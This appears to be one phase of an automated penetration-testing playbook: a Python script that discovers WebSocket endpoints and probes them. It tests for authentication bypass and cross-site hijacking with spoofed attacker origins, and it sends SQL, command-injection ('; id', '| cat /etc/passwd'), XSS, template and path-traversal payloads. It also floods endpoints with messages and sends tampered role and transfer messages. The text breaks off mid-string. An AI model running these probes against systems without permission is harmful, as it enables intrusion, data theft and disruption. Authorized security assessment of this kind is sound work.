**Phase 26 — WebSocket Security Testing**

  Tests for WebSocket endpoints and their security posture: CSWSH, authentication bypass,
  injection through WS messages, unauthorized channel access, rate limiting, and message tampering.
  Run this as ONE complete run_python block. It iterates all discovered endpoints automatically.

  ```python
  import time, re, json, ssl, socket, struct, hashlib, base64, threading
  from urllib.parse import urljoin, urlparse, parse_qs

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  COOKIE  = _G.get('COOKIE', '')
  AUTH_PAGES = _G.get('AUTH_PAGES', {})
  ALL_PAGES  = _G.get('ALL_PAGES', {})
  ALL_LINKS  = _G.get('ALL_LINKS', set())
  DELAY = 0.5

  ws_findings = []

  # ── Try importing websocket-client; fall back to raw sockets ────────────────
  WS_LIB_AVAILABLE = False
  try:
      import websocket
      WS_LIB_AVAILABLE = True
      print("[WS] websocket-client library available")
  except ImportError:
      print("[WS] websocket-client not installed — using raw socket fallback")

  # ══════════════════════════════════════════════════════════════
  # HELPER — Raw HTTP Upgrade handshake (fallback when no lib)
  # ══════════════════════════════════════════════════════════════
  def raw_ws_connect(url, origin=None, cookie=None, timeout=5):
      """
      Attempt a raw WebSocket upgrade via TCP socket.
      Returns (success: bool, status_line: str, headers: dict, sock_or_error).
      """
      parsed = urlparse(url)
      use_ssl = parsed.scheme in ('wss', 'https')
      host = parsed.hostname
      port = parsed.port or (443 if use_ssl else 80)
      path = parsed.path or '/'
      if parsed.query:
          path += '?' + parsed.query

      ws_key = base64.b64encode(hashlib.sha1(str(time.time()).encode()).digest()[:16]).decode()

      headers = [
          f"GET {path} HTTP/1.1",
          f"Host: {host}",
          "Upgrade: websocket",
          "Connection: Upgrade",
          f"Sec-WebSocket-Key: {ws_key}",
          "Sec-WebSocket-Version: 13",
      ]
      if origin:
          headers.append(f"Origin: {origin}")
      if cookie:
          headers.append(f"Cookie: {cookie}")
      headers.append("")
      headers.append("")

      try:
          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          sock.settimeout(timeout)
          if use_ssl:
              ctx = ssl.create_default_context()
              ctx.check_hostname = False
              ctx.verify_mode = ssl.CERT_NONE
              sock = ctx.wrap_socket(sock, server_hostname=host)
          sock.connect((host, port))
          sock.sendall("\r\n".join(headers).encode())

          response = b""
          while b"\r\n\r\n" not in response:
              chunk = sock.recv(4096)
              if not chunk:
                  break
              response += chunk

          resp_str = response.decode('utf-8', errors='replace')
          lines = resp_str.split("\r\n")
          status_line = lines[0] if lines else ""
          resp_headers = {}
          for line in lines[1:]:
              if ':' in line:
                  k, v = line.split(':', 1)
                  resp_headers[k.strip().lower()] = v.strip()

          success = '101' in status_line
          return (success, status_line, resp_headers, sock if success else resp_str)
      except Exception as e:
          return (False, str(e), {}, str(e))

  def raw_ws_send_text(sock, message):
      """Send a text frame over a raw WebSocket socket."""
      payload = message.encode('utf-8')
      frame = bytearray()
      frame.append(0x81)  # FIN + text opcode
      mask_key = struct.pack('!I', int(time.time() * 1000) & 0xFFFFFFFF)
      length = len(payload)
      if length < 126:
          frame.append(0x80 | length)  # masked
      elif length < 65536:
          frame.append(0x80 | 126)
          frame.extend(struct.pack('!H', length))
      else:
          frame.append(0x80 | 127)
          frame.extend(struct.pack('!Q', length))
      frame.extend(mask_key)
      masked = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(payload))
      frame.extend(masked)
      sock.sendall(bytes(frame))

  def raw_ws_recv(sock, timeout=3):
      """Receive data from a raw WebSocket socket."""
      sock.settimeout(timeout)
      try:
          data = sock.recv(8192)
          if len(data) < 2:
              return None
          # Parse frame header
          second_byte = data[1] & 0x7f
          if second_byte < 126:
              payload_start = 2
          elif second_byte == 126:
              payload_start = 4
          else:
              payload_start = 10
          return data[payload_start:].decode('utf-8', errors='replace')
      except (socket.timeout, Exception):
          return None

  # ══════════════════════════════════════════════════════════════
  # PART A — WebSocket Endpoint Discovery
  # ══════════════════════════════════════════════════════════════
  print("[WS] === PART A: WebSocket Endpoint Discovery ===\n")

  parsed_base = urlparse(BASE)
  base_host = parsed_base.hostname
  base_scheme = parsed_base.scheme
  ws_scheme = 'wss' if base_scheme == 'https' else 'ws'
  http_base = BASE.rstrip('/')

  # A1. Search crawled page bodies for WebSocket references
  WS_PATTERNS = [
      r'wss?://[^\s\'"<>]+',
      r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)',
      r'socket\.io',
      r'sockjs',
      r'io\(\s*[\'"]([^\'"]+)',           # socket.io client: io('url')
      r'SockJS\s*\(\s*[\'"]([^\'"]+)',
      r'\.connect\s*\(\s*[\'"]wss?://[^\'"]+',
      r'signalr',
      r'ActionCable',
  ]

  discovered_ws_urls = set()
  ws_indicators = []

  all_pages = {}
  all_pages.update(ALL_PAGES)
  all_pages.update(AUTH_PAGES)

  for page_url, body in all_pages.items():
      if not isinstance(body, str):
          continue
      # Search for ws:// or wss:// URLs
      for match in re.findall(r'wss?://[^\s\'"<>)+]+', body):
          discovered_ws_urls.add(match.rstrip('/'))
      # Search for new WebSocket('...')
      for match in re.findall(r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)', body):
          if match.startswith('ws'):
              discovered_ws_urls.add(match.rstrip('/'))
          else:
              discovered_ws_urls.add(f"{ws_scheme}://{base_host}{match}")
      # socket.io client connect
      for match in re.findall(r'io\(\s*[\'"]([^\'"]+)', body):
          if match.startswith(('ws', 'http')):
              ws_indicators.append(('socket.io', match, page_url))
          else:
              ws_indicators.append(('socket.io', urljoin(BASE, match), page_url))
      # SockJS
      for match in re.findall(r'SockJS\s*\(\s*[\'"]([^\'"]+)', body):
          ws_indicators.append(('sockjs', match, page_url))
      # General keyword hits
      for kw in ['socket.io', 'sockjs', 'signalr', 'ActionCable', 'cable']:
          if kw.lower() in body.lower():
              ws_indicators.append(('keyword', kw, page_url))

  # A2. Probe common WebSocket paths via HTTP Upgrade
  COMMON_WS_PATHS = [
      '/ws', '/websocket', '/ws/', '/websocket/',
      '/socket.io/?EIO=4&transport=websocket',
      '/socket.io/?EIO=3&transport=websocket',
      '/sockjs/info',
      '/sockjs/websocket',
      '/cable',            # ActionCable (Rails)
      '/hub', '/signalr',  # SignalR (.NET)
      '/graphql',          # GraphQL subscriptions
      '/api/ws', '/api/websocket',
      '/chat', '/chat/ws',
      '/notifications', '/events',
      '/stream', '/live', '/realtime',
      '/ws/v1', '/ws/v2',
  ]

  print(f"  Scanning crawled pages: found {len(discovered_ws_urls)} WS URLs, {len(ws_indicators)} indicators")

  for path in COMMON_WS_PATHS:
      url = http_base + path
      try:
          time.sleep(0.15)
          r = session.get(url, timeout=5, allow_redirects=False,
                          headers={'Upgrade': 'websocket', 'Connection': 'Upgrade',
                                   'Sec-WebSocket-Version': '13',
                                   'Sec-WebSocket-Key': base64.b64encode(b'test12345678test').decode()})
          if r.status_code == 101:
              ws_url = f"{ws_scheme}://{base_host}{path}"
              discovered_ws_urls.add(ws_url)
              print(f"  [FOUND] HTTP 101 Upgrade accepted: {path}")
          elif r.status_code == 200 and 'upgrade' in r.headers.get('Connection', '').lower():
              ws_url = f"{ws_scheme}://{base_host}{path}"
              discovered_ws_urls.add(ws_url)
              print(f"  [FOUND] Upgrade header in response: {path}")
          elif r.status_code == 200 and '/sockjs/info' in path:
              # SockJS info endpoint returns JSON with websocket: true/false
              try:
                  info = r.json()
                  if info.get('websocket', False):
                      ws_url = f"{ws_scheme}://{base_host}/sockjs/websocket"
                      discovered_ws_urls.add(ws_url)
                      print(f"  [FOUND] SockJS websocket enabled: {path}")
              except Exception:
                  pass
          elif r.status_code in (400, 426):
              # 400 = "Upgrade Required" style — endpoint exists but needs proper WS handshake
              ws_url = f"{ws_scheme}://{base_host}{path}"
              discovered_ws_urls.add(ws_url)
              print(f"  [FOUND] WS endpoint exists (HTTP {r.status_code}): {path}")
      except Exception:
          pass

  # Also add any paths from crawled links that hint at websocket
  for link in ALL_LINKS:
      for kw in ['/ws', '/websocket', '/socket.io', '/sockjs', '/cable', '/hub', '/signalr']:
          if kw in link.lower():
              ws_path = urlparse(link).path
              ws_url = f"{ws_scheme}://{base_host}{ws_path}"
              discovered_ws_urls.add(ws_url)

  print(f"\n  Total WebSocket endpoints discovered: {len(discovered_ws_urls)}")
  for ws_url in sorted(discovered_ws_urls):
      print(f"    {ws_url}")

  if ws_indicators:
      print(f"\n  WebSocket indicators found in pages:")
      seen = set()
      for kind, detail, page in ws_indicators[:20]:
          key = (kind, detail)
          if key not in seen:
              seen.add(key)
              print(f"    [{kind}] {detail} (in {page})")

  _G['WS_ENDPOINTS'] = list(discovered_ws_urls)
  _G['WS_INDICATORS'] = ws_indicators

  if not discovered_ws_urls:
      print("\n[WS] No WebSocket endpoints discovered. Skipping remaining WS tests.")
  else:

      # ══════════════════════════════════════════════════════════════
      # PART B — Connection Testing & Authentication
      # ══════════════════════════════════════════════════════════════
      print("\n[WS] === PART B: Connection & Authentication Testing ===\n")

      # Build cookie string from session
      cookie_str = COOKIE
      if not cookie_str and session and session.cookies:
          cookie_str = '; '.join(f'{c.name}={c.value}' for c in session.cookies)

      for ws_url in sorted(discovered_ws_urls):
          print(f"\n  Testing: {ws_url}")

          # B1. Connect WITH authentication
          auth_ok = False
          if WS_LIB_AVAILABLE:
              try:
                  ws = websocket.create_connection(
                      ws_url,
                      timeout=5,
                      cookie=cookie_str if cookie_str else None,
                      origin=http_base,
                      sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                  )
                  auth_ok = True
                  print(f"    [OK] Authenticated connection successful")
                  # Try receiving a message
                  ws.settimeout(3)
                  try:
                      msg = ws.recv()
                      print(f"    [DATA] Received on connect: {msg[:200]}")
                  except Exception:
                      pass
                  ws.close()
              except Exception as e:
                  print(f"    [FAIL] Authenticated connection failed: {str(e)[:100]}")
          else:
              # Raw fallback
              ok, status, hdrs, result = raw_ws_connect(ws_url, origin=http_base, cookie=cookie_str)
              if ok:
                  auth_ok = True
                  print(f"    [OK] Authenticated connection successful (raw)")
                  try:
                      msg = raw_ws_recv(result, timeout=3)
                      if msg:
                          print(f"    [DATA] Received: {msg[:200]}")
                      result.close()
                  except Exception:
                      pass
              else:
                  print(f"    [FAIL] Authenticated connection failed: {status[:100]}")

          time.sleep(DELAY)

          # B2. Connect WITHOUT authentication (test auth bypass)
          noauth_ok = False
          noauth_evidence = ""
          if WS_LIB_AVAILABLE:
              try:
                  ws = websocket.create_connection(
                      ws_url,
                      timeout=5,
                      origin=http_base,
                      sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                      # No cookie — unauthenticated
                  )
                  noauth_ok = True
                  noauth_evidence = "WebSocket connection accepted without any authentication cookies/tokens"
                  ws.settimeout(3)
                  try:
                      msg = ws.recv()
                      noauth_evidence += f"\nReceived data: {msg[:500]}"
                  except Exception:
                      pass
                  ws.close()
              except Exception as e:
                  print(f"    [OK] Unauthenticated connection rejected: {str(e)[:80]}")
          else:
              ok, status, hdrs, result = raw_ws_connect(ws_url, origin=http_base, cookie=None)
              if ok:
                  noauth_ok = True
                  noauth_evidence = f"WebSocket upgrade accepted without cookies: {status}"
                  try:
                      msg = raw_ws_recv(result, timeout=3)
                      if msg:
                          noauth_evidence += f"\nReceived: {msg[:500]}"
                      result.close()
                  except Exception:
                      pass
              else:
                  print(f"    [OK] Unauthenticated connection rejected: {status[:80]}")

          if noauth_ok and auth_ok:
              print(f"    [HIGH] WS Authentication Bypass — connection accepted without credentials!")
              ws_findings.append({
                  'type': 'ws-auth-bypass',
                  'severity': 'HIGH',
                  'url': ws_url,
                  'evidence': noauth_evidence,
              })
          elif noauth_ok and not auth_ok:
              print(f"    [INFO] WS accepts unauthenticated connections (may be intentional — e.g. public chat)")

          time.sleep(DELAY)

      # ══════════════════════════════════════════════════════════════
      # PART C — Cross-Site WebSocket Hijacking (CSWSH)
      # ══════════════════════════════════════════════════════════════
      print("\n[WS] === PART C: Cross-Site WebSocket Hijacking (CSWSH) ===\n")

      EVIL_ORIGINS = [
          'http://evil.com',
          'https://attacker.example.com',
          'http://localhost:9999',
          'null',  # data: URIs send Origin: null
      ]

      for ws_url in sorted(discovered_ws_urls):
          print(f"\n  Testing CSWSH: {ws_url}")

          for evil_origin in EVIL_ORIGINS:
              time.sleep(0.3)
              cswsh_ok = False
              cswsh_evidence = ""

              if WS_LIB_AVAILABLE:
                  try:
                      ws = websocket.create_connection(
                          ws_url,
                          timeout=5,
                          cookie=cookie_str if cookie_str else None,
                          origin=evil_origin,
                          sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                      )
                      cswsh_ok = True
                      cswsh_evidence = f"WebSocket accepted connection with Origin: {evil_origin}"
                      ws.settimeout(3)
                      try:
                          msg = ws.recv()
                          cswsh_evidence += f"\nReceived data with evil origin: {msg[:500]}"
                      except Exception:
                          pass
                      ws.close()
                  except Exception as e:
                      pass  # Connection rejected — good
              else:
                  ok, status, hdrs, result = raw_ws_connect(
                      ws_url, origin=evil_origin, cookie=cookie_str)
                  if ok:
                      cswsh_ok = True
                      cswsh_evidence = f"WebSocket upgrade accepted with Origin: {evil_origin} — {status}"
                      try:
                          msg = raw_ws_recv(result, timeout=3)
                          if msg:
                              cswsh_evidence += f"\nReceived: {msg[:500]}"
                          result.close()
                      except Exception:
                          pass

              if cswsh_ok:
                  print(f"    [HIGH] CSWSH — Origin '{evil_origin}' accepted!")
                  ws_findings.append({
                      'type': 'cswsh',
                      'severity': 'HIGH',
                      'url': ws_url,
                      'origin': evil_origin,
                      'evidence': cswsh_evidence,
                  })
                  break  # One evil origin is enough to confirm
              else:
                  print(f"    [OK] Origin '{evil_origin}' rejected")

      # ══════════════════════════════════════════════════════════════
      # PART D — Injection via WebSocket Messages
      # ══════════════════════════════════════════════════════════════
      print("\n[WS] === PART D: Injection via WebSocket Messages ===\n")

      INJECTION_PAYLOADS = [
          # SQLi
          {'label': 'SQLi', 'payload': "' OR '1'='1' --",
           'detect': lambda r: any(e in r.lower() for e in ['syntax error','sqlite','mysql','sql','query error','unclosed quotation'])},
          {'label': 'SQLi-union', 'payload': "' UNION SELECT NULL,NULL--",
           'detect': lambda r: any(e in r.lower() for e in ['syntax error','column','union','select'])},
          # XSS
          {'label': 'XSS', 'payload': '<script>alert(1)</script>',
           'detect': lambda r: '<script>alert(1)</script>' in r},
          {'label': 'XSS-img', 'payload': '<img src=x onerror=alert(1)>',
           'detect': lambda r: 'onerror=alert' in r},
          # Command injection
          {'label': 'CMDi', 'payload': '; id',
           'detect': lambda r: 'uid=' in r and 'gid=' in r},
          {'label': 'CMDi-pipe', 'payload': '| cat /etc/passwd',
           'detect': lambda r: 'root:' in r and '/bin/' in r},
          # SSTI
          {'label': 'SSTI', 'payload': '{{7*7}}',
           'detect': lambda r: '49' in r},
          {'label': 'SSTI-jinja', 'payload': '${7*7}',
           'detect': lambda r: '49' in r},
          # Path traversal
          {'label': 'PathTraversal', 'payload': '../../../etc/passwd',
           'detect': lambda r: 'root:' in r},
          # JSON injection (for JSON-based WS protocols)
          {'label': 'JSON-inject', 'payload': '{"action":"admin","role":"admin"}',
           'detect': lambda r: 'admin' in r.lower() and ('granted' in r.lower() or 'success' in r.lower())},
      ]

      # Also try wrapping payloads in JSON if the WS uses JSON messages
      def wrap_json_payloads(payload_str):
          """Return both raw and JSON-wrapped versions of a payload."""
          variants = [payload_str]
          try:
              variants.append(json.dumps({"message": payload_str}))
              variants.append(json.dumps({"data": payload_str}))
              variants.append(json.dumps({"text": payload_str}))
              variants.append(json.dumps({"cmd": payload_str}))
          except Exception:
              pass
          return variants

      for ws_url in sorted(discovered_ws_urls):
          print(f"\n  Injection testing: {ws_url}")

          for inj in INJECTION_PAYLOADS:
              time.sleep(0.3)
              all_variants = wrap_json_payloads(inj['payload'])

              for variant in all_variants:
                  response_text = ""
                  try:
                      if WS_LIB_AVAILABLE:
                          ws = websocket.create_connection(
                              ws_url, timeout=5,
                              cookie=cookie_str if cookie_str else None,
                              origin=http_base,
                              sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                          )
                          # Wait for initial message if any
                          ws.settimeout(2)
                          try:
                              ws.recv()
                          except Exception:
                              pass
                          # Send injection payload
                          ws.send(variant)
                          ws.settimeout(3)
                          try:
                              response_text = ws.recv()
                          except Exception:
                              pass
                          ws.close()
                      else:
                          ok, status, hdrs, sock = raw_ws_connect(
                              ws_url, origin=http_base, cookie=cookie_str)
                          if ok:
                              raw_ws_recv(sock, timeout=2)  # consume welcome
                              raw_ws_send_text(sock, variant)
                              response_text = raw_ws_recv(sock, timeout=3) or ""
                              sock.close()
                  except Exception as e:
                      continue

                  if response_text and inj['detect'](response_text):
                      print(f"    [CRITICAL] {inj['label']} injection confirmed!")
                      print(f"      Payload: {variant[:100]}")
                      print(f"      Response: {response_text[:300]}")
                      ws_findings.append({
                          'type': f"ws-injection-{inj['label'].lower()}",
                          'severity': 'CRITICAL' if inj['label'] in ('SQLi', 'CMDi', 'CMDi-pipe') else 'HIGH',
                          'url': ws_url,
                          'payload': variant,
                          'evidence': response_text[:2000],
                          'label': inj['label'],
                      })
                      break  # One variant is enough per injection type
              else:
                  continue
              break  # Found a hit — move to next injection type (outer loop continues)

      # ══════════════════════════════════════════════════════════════
      # PART E — Unauthorized Channel / Room Access
      # ══════════════════════════════════════════════════════════════
      print("\n[WS] === PART E: Unauthorized Channel/Room Access ===\n")

      SUBSCRIBE_PAYLOADS = [
          # Generic subscription attempts
          '{"action":"subscribe","channel":"admin"}',
          '{"type":"subscribe","topic":"admin"}',
          '{"event":"subscribe","room":"private"}',
          '{"subscribe":"notifications"}',
          '{"action":"join","room":"admin"}',
          '{"type":"join","channel":"all"}',
          # ActionCable
          '{"command":"subscribe","identifier":"{\\"channel\\":\\"AdminChannel\\"}"}',
          # Socket.io
          '42["join","admin"]',
          '42["subscribe","private-admin"]',
          # GraphQL subscriptions
          '{"type":"connection_init","payload":{}}',
          '{"id":"1","type":"start","payload":{"query":"subscription { allMessages { content user } }"}}',
      ]

      for ws_url in sorted(discovered_ws_urls):
          print(f"\n  Channel access testing: {ws_url}")

          for sub_payload in SUBSCRIBE_PAYLOADS:
              time.sleep(0.3)
              response_text = ""
              try:
                  if WS_LIB_AVAILABLE:
                      ws = websocket.create_connection(
                          ws_url, timeout=5,
                          cookie=cookie_str if cookie_str else None,
                          origin=http_base,
                          sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                      )
                      ws.settimeout(2)
                      try:
                          ws.recv()
                      except Exception:
                          pass
                      ws.send(sub_payload)
                      ws.settimeout(3)
                      try:
                          response_text = ws.recv()
                      except Exception:
                          pass
                      ws.close()
                  else:
                      ok, status, hdrs, sock = raw_ws_connect(
                          ws_url, origin=http_base, cookie=cookie_str)
                      if ok:
                          raw_ws_recv(sock, timeout=2)
                          raw_ws_send_text(sock, sub_payload)
                          response_text = raw_ws_recv(sock, timeout=3) or ""
                          sock.close()
              except Exception:
                  continue

              if response_text:
                  resp_lower = response_text.lower()
                  # Detect subscription success indicators
                  success_signs = ['subscribed', 'joined', 'confirm_subscription',
                                   'connection_ack', '"type":"data"', 'welcome']
                  reject_signs = ['unauthorized', 'forbidden', 'denied', 'error',
                                  'not allowed', 'invalid', 'rejected']

                  is_success = any(s in resp_lower for s in success_signs)
                  is_reject = any(s in resp_lower for s in reject_signs)

                  if is_success and not is_reject:
                      print(f"    [MEDIUM] Subscribed to channel: {sub_payload[:80]}")
                      print(f"      Response: {response_text[:200]}")
                      ws_findings.append({
                          'type': 'ws-unauth-channel',
                          'severity': 'MEDIUM',
                          'url': ws_url,
                          'payload': sub_payload,
                          'evidence': response_text[:2000],
                      })

      # ══════════════════════════════════════════════════════════════
      # PART F — Rate Limiting / Message Flooding
      # ══════════════════════════════════════════════════════════════
      print("\n[WS] === PART F: Rate Limiting ===\n")

      for ws_url in sorted(discovered_ws_urls):
          print(f"\n  Rate limit testing: {ws_url}")
          flood_count = 0
          flood_errors = 0
          flood_evidence = ""

          try:
              if WS_LIB_AVAILABLE:
                  ws = websocket.create_connection(
                      ws_url, timeout=5,
                      cookie=cookie_str if cookie_str else None,
                      origin=http_base,
                      sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                  )
                  ws.settimeout(2)
                  try:
                      ws.recv()  # consume welcome
                  except Exception:
                      pass

                  # Send 50 rapid messages
                  test_msg = json.dumps({"message": "rate_limit_test", "ts": "0"})
                  for i in range(50):
                      try:
                          ws.send(test_msg)
                          flood_count += 1
                      except Exception as e:
                          flood_errors += 1
                          flood_evidence = str(e)
                          break

                  # Check if connection is still alive
                  still_alive = True
                  try:
                      ws.ping()
                      ws.recv()
                  except Exception:
                      still_alive = False
                  ws.close()
              else:
                  ok, status, hdrs, sock = raw_ws_connect(
                      ws_url, origin=http_base, cookie=cookie_str)
                  if ok:
                      raw_ws_recv(sock, timeout=2)
                      test_msg = json.dumps({"message": "rate_limit_test"})
                      for i in range(50):
                          try:
                              raw_ws_send_text(sock, test_msg)
                              flood_count += 1
                          except Exception as e:
                              flood_errors += 1
                              flood_evidence = str(e)
                              break
                      still_alive = True
                      try:
                          sock.sendall(b'\x89\x80\x00\x00\x00\x00')  # ping
                          sock.recv(128)
                      except Exception:
                          still_alive = False
                      sock.close()
                  else:
                      print(f"    [SKIP] Could not connect")
                      continue

              if flood_count >= 50 and flood_errors == 0:
                  print(f"    [LOW] No rate limiting — sent {flood_count} messages without throttling")
                  ws_findings.append({
                      'type': 'ws-no-rate-limit',
                      'severity': 'LOW',
                      'url': ws_url,
                      'evidence': f"Sent {flood_count} rapid messages with no throttling or disconnection. Connection still alive: {still_alive}",
                  })
              elif flood_errors > 0:
                  print(f"    [OK] Rate limiting detected after {flood_count} messages: {flood_evidence[:80]}")
              else:
                  print(f"    [OK] Sent {flood_count} messages, connection dropped (possible rate limit)")

          except Exception as e:
              print(f"    [SKIP] Connection error: {str(e)[:80]}")

      # ══════════════════════════════════════════════════════════════
      # PART G — Message Tampering (ID/Role Manipulation)
      # ══════════════════════════════════════════════════════════════
      print("\n[WS] === PART G: Message Tampering ===\n")

      TAMPER_PAYLOADS = [
          # User ID manipulation
          {'msg': '{"user_id": 1, "action": "get_profile"}', 'label': 'user_id=1'},
          {'msg': '{"user_id": 0, "action": "get_profile"}', 'label': 'user_id=0 (admin)'},
          {'msg': '{"userId": "admin", "action": "get_data"}', 'label': 'userId=admin'},
          # Role escalation
          {'msg': '{"role": "admin", "action": "update_role"}', 'label': 'role=admin'},
          {'msg': '{"type": "admin_action", "command": "list_users"}', 'label': 'admin command'},
          # Amount manipulation
          {'msg': '{"action": "transfer", "amount": -100, "to": "attacker"}', 'label': 'negative amount'},
          {'msg': '{"action": "transfer", "amount": 0.001, "to": "attacker"}', 'label': 'micro amount'},
          {'msg': '{"action": "transfer", "amount": 99999999, "to": "attacker"}', 'label': 'huge amount'},
          # Debug/internal
          {'msg': '{"action": "debug", "verbose": true}', 'label': 'debug mode'},
          {'msg': '{"type": "ping", "__admin": true}', 'label': 'admin flag'},
      ]

      for ws_url in sorted(discovered_ws_urls):
          print(f"\n  Message tampering: {ws_url}")

          for tamper in TAMPER_PAYLOADS:
              time.sleep(0.3)
              response_text = ""
              try:
                  if WS_LIB_AVAILABLE:
                      ws = websocket.create_connection(
                          ws_url, timeout=5,
                          cookie=cookie_str if cookie_str else None,
                          origin=http_base,
                          sslopt={"cert_reqs": ssl.CERT_NONE} if ws_url.startswith('wss') else None,
                      )
                      ws.settimeout(2)
                      try:
                          ws.recv()
                      except Exception:
                          pass
                      ws.send(tamper['msg'])
                      ws.settimeout(3)
                      try:
                          response_text = ws.recv()
                      except Exception:
                          pass
                      ws.close()
                  else:
                      ok, status, hdrs, sock = raw_ws_connect(
                          ws_url, origin=http_base, cookie=cookie_str)
                      if ok:
                          raw_ws_recv(sock, timeout=2)
                          raw_ws_send_text(sock, tamper['msg'])
                          response_text = raw_ws_recv(sock, timeout=3) or ""
                          sock.close()
              except Exception:
                  continue

              if response_text:
                  resp_lower = response_text.lower()
                  # Look for signs of data leakage or privilege escalation
                  escalation_signs = ['admin', 'root', 'superuser', 'privilege',
                                      'granted', 'success', 'authorized', 'password',
                                      'secret', 'token', 'api_key', 'credit']
                  error_signs = ['error', 'invalid', 'denied', 'forbidden',
                                 'unauthorized', 'not found', 'rejected']

                  has_escalation = any(s in resp_lower for s in escalation_signs)
                  has_error = any(s in resp_lower for s in error_signs)

                  if has_escalation and not has_error:
                      print(f"    [HIGH] Tampered message accepted: {tamper['label']}")
                      print(f"      Response: {response_text[:200]}")
                      ws_findings.append({
                          'type': 'ws-message-tamper',
                          'severity': 'HIGH',
                          'url': ws_url,
                          'payload': tamper['msg'],
                          'label': tamper['label'],
                          'evidence': response_text[:2000],
                      })
                  elif response_text and not has_error:
                      print(f"    [INFO] Response to '{tamper['label']}': {response_text[:100]}")

  # ══════════════════════════════════════════════════════════════
  # SUMMARY — Store findings in _G['FINDINGS']
  # ══════════════════════════════════════════════════════════════
  print(f"\n{'='*70}")
  print(f"[WS] === WEBSOCKET SECURITY SUMMARY: {len(ws_findings)} issues found ===")
  for f in ws_findings:
      print(f"  [{f['severity']}] {f['type']}: {f.get('url','')} — {f.get('evidence','')[:100]}")

  if ws_findings:
      _UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

      for f in ws_findings:
          # Map finding types to professional titles and remediation
          title_map = {
              'ws-auth-bypass':     ('WebSocket Auth Bypass',       'HIGH',
                                     'Attacker can connect to WebSocket endpoint without authentication and access protected functionality.',
                                     'Validate authentication tokens/cookies during the WebSocket handshake. Reject connections without valid session credentials.'),
              'cswsh':              ('WebSocket Hijacking',         'HIGH',
                                     'Cross-Site WebSocket Hijacking — attacker page can establish a WebSocket connection using the victim\'s cookies, enabling data theft or actions on behalf of the victim.',
                                     'Validate the Origin header during WebSocket handshake. Only accept connections from trusted origins. Implement CSRF tokens in the WebSocket upgrade request.'),
              'ws-injection-sqli':  ('SQL Injection',               'CRITICAL',
                                     'SQL injection via WebSocket messages allows database manipulation or data exfiltration.',
                                     'Use parameterised queries for all database operations triggered by WebSocket messages. Validate and sanitise all input received via WebSocket.'),
              'ws-injection-sqli-union': ('SQL Injection',          'CRITICAL',
                                     'SQL injection via WebSocket messages allows database manipulation or data exfiltration.',
                                     'Use parameterised queries for all database operations triggered by WebSocket messages.'),
              'ws-injection-xss':   ('Reflected XSS',              'HIGH',
                                     'XSS payload sent via WebSocket is reflected back unescaped, enabling script execution in connected clients.',
                                     'Sanitise and encode all data before broadcasting to WebSocket clients. Apply context-aware output encoding.'),
              'ws-injection-xss-img': ('Reflected XSS',            'HIGH',
                                     'XSS payload via WebSocket reflected to clients without sanitisation.',
                                     'Sanitise and encode all data before broadcasting to WebSocket clients.'),
              'ws-injection-cmdi':  ('Command Injection',          'CRITICAL',
                                     'OS command injection via WebSocket messages allows arbitrary command execution on the server.',
                                     'Never pass WebSocket message content to shell commands. Use safe APIs and strict input validation.'),
              'ws-injection-cmdi-pipe': ('Command Injection',      'CRITICAL',
                                     'OS command injection via WebSocket messages allows arbitrary command execution.',
                                     'Never pass WebSocket message content to shell commands. Use allowlists and safe APIs.'),
              'ws-injection-ssti':  ('Template Injection',         'HIGH',
                                     'Server-side template injection via WebSocket messages may allow remote code execution.',
                                     'Never render WebSocket message content through template engines. Use sandboxed templates.'),
              'ws-injection-ssti-jinja': ('Template Injection',    'HIGH',
                                     'Server-side template injection via WebSocket messages.',
                                     'Never render WebSocket message content through template engines.'),
              'ws-injection-pathtraversal': ('Path Traversal',     'HIGH',
                                     'Path traversal via WebSocket messages may allow reading arbitrary files on the server.',
                                     'Validate and canonicalise file paths. Use allowlists for accessible resources.'),
              'ws-injection-json-inject': ('Broken Access Control', 'HIGH',
                                     'WebSocket accepts manipulated JSON payloads that grant elevated privileges.',
                                     'Enforce server-side authorisation for all actions. Never trust client-supplied role or permission fields.'),
              'ws-unauth-channel':  ('Broken Access Control',      'MEDIUM',
                                     'Unauthenticated or low-privilege user can subscribe to restricted WebSocket channels and receive sensitive data.',
                                     'Enforce channel-level authorisation. Verify user permissions before allowing subscription to private channels.'),
              'ws-no-rate-limit':   ('Missing Rate Limiting',      'LOW',
                                     'WebSocket endpoint accepts unlimited messages without throttling, enabling denial of service or abuse.',
                                     'Implement server-side rate limiting on WebSocket messages. Disconnect or throttle clients exceeding thresholds.'),
              'ws-message-tamper':  ('Broken Access Control',      'HIGH',
                                     'WebSocket accepts tampered messages with manipulated user IDs, roles, or amounts without server-side validation.',
                                     'Validate all fields server-side. Never trust client-supplied identity or authorisation fields in WebSocket messages.'),
          }

          ftype = f['type']
          title, severity, impact, remediation = title_map.get(ftype, ('WebSocket Vulnerability', f['severity'],
                                                                         f.get('evidence',''), 'Review WebSocket security controls.'))

          # Build curl-equivalent POC (WebSocket upgrade via curl)
          _cookie_flag = ''
          if cookie_str:
              _cookie_flag = f' \\\n  -b "{cookie_str}"'
          _origin = f.get('origin', http_base)
          ws_path = urlparse(f['url']).path or '/'

          _curl_poc = f'''UA="{_UA}"
# WebSocket upgrade request (shows handshake acceptance):
curl -sk -A "$UA" -i \\
  -H "Upgrade: websocket" \\
  -H "Connection: Upgrade" \\
  -H "Sec-WebSocket-Version: 13" \\
  -H "Sec-WebSocket-Key: dGVzdGtleTEyMzQ1Njc4" \\
  -H "Origin: {_origin}"{_cookie_flag} \\
  "{f['url'].replace('ws://', 'http://').replace('wss://', 'https://')}"
# Expected: HTTP/1.1 101 Switching Protocols — confirms WebSocket accepts the connection'''

          if f.get('payload'):
              _curl_poc += f'''

